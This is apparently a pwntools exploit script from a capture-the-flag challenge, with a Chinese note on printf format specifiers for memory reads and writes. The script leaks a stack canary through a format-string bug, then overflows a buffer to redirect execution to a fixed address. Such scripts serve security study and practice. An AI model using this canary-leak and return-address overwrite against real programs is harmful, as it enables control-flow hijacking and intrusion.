'''
格式化符号说明
%x 以十六进制打印，只能打印4字节，一般只用于32位
%p 打印目标地址，建议32位和64位都用这个
%s 打印地址内容
%c 打印单个字符
%hhn 写一字节
%hn  写两字节
%n   写四字节
%ln  32位写四字节，64位写八字节
%lln 写八字节
'''
from pwn import *
context(os="linux", arch="amd64", log_level="debug")
# p=process("./canary")

p.sendlineafter("Give me some gift?\n","aaaaaaaa%11$p".encode())
p.recvuntil("aaaaaaaa")
canary=int(p.recvuntil(b"00").decode(),16)
print(hex(canary))
p.sendafter("Show me your magic",b'a'*40+p64(canary)+b'a'*8+p64(0x401262))
p.interactive()